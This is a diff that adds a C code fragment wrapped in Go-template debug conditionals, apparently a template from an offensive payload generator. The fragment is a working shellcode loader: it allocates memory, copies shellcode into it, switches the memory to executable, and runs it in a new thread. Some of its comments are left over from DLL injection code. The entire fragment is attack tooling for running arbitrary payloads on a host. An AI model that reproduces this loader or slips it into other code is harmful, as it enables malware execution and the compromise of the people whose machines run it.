@@ -1,0 +1,55 @@
+    shellcodeLen = strlen(shellcode);
+    HANDLE hProcess = GetCurrentProcess();
+    // Allocate space in the remote process for the pathname
+
+    {{if .Debug}}
+    printf("[*] Attempting to inject\n");
+    {{end}}
+
+    PVOID pBuffer = VirtualAlloc(NULL, shellcodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+    if (pBuffer == NULL)
+    {
+        {{if .Debug}}
+        printf(TEXT("[-] Error: Could not allocate memory inside PID.\n"));
+        {{end}}
+        return(1);
+    }
+
+    // Copy the DLL's pathname to the remote process address space
+    DWORD n = WriteProcessMemory(hProcess, pBuffer, shellcode, shellcodeLen, NULL);
+    if (n == 0)
+    {
+        {{if .Debug}}
+        printf(TEXT("[-] Error: Could not write any bytes into the PID address space.\n"));
+        {{end}}
+        return(1);
+    }
+
+    DWORD dummy;
+    if (!VirtualProtectEx(hProcess, pBuffer, shellcodeLen, PAGE_EXECUTE_READ, &dummy))
+    {
+        {{if .Debug}}
+        printf(TEXT("[-] Error: VirtualProtect - could not change memory to executable\n"));
+        {{end}}
+        return(1);
+    }
+
+    {{if .Debug}}
+    printf("[*] Attempting to create thread");
+    {{end}}
+
+    HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pBuffer, (LPVOID)NULL, 0, NULL);
+
+    if(h == NULL){
+            {{if .Debug}}
+            printf("CreateThread failed. Error");
+            {{end}}
+            return 1;
+        }
+        else {
+             {{if .Debug}}
+             printf("[+] Thread created");
+             {{end}}
+        }
+    DWORD dwWaitResult = WaitForSingleObject(h,INFINITE);
+    return 0;
